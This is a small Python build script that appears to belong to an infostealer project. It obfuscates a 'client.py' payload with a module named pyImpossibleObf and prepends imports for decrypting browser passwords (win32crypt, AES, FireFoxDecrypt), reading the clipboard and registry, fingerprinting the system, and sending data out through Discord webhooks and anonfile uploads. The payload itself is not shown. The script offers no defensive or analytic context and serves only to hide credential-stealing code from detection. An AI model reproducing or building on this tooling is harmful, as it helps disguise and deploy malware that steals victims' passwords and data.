import uuid
#from Crypto.Cipher import AES
import base64
import hashlib
import pyImpossibleObf

hashfile = "y"

pyImpossibleObf.obfuscate("client.py")
print("[.] Created client.py.hashed.py .")
txt = open("client.py.hashed.py", "r").read()
open("client.py.hashed.py", "w+").write("""import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir, walk
import sqlite3
from discord_webhook import DiscordWebhook, DiscordEmbed
import discord
import win32crypt
import shutil
import command
import random
import threading
import re
import wmi
import uuid
import textwrap
import psutil
import glob
import FireFoxDecrypt
import requests
import sys
import base64
from base64 import b64decode
from json import loads
from regex import findall
import platform
import time
from pathlib import Path
import codecs
import pyImpossibleObf
import json
import base64
from addict import Dict
import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import winreg as reg
import winreg
from anonfile import AnonFile
import getpass
import zipfile
import win32clipboard
from os import walk\n""" + txt)
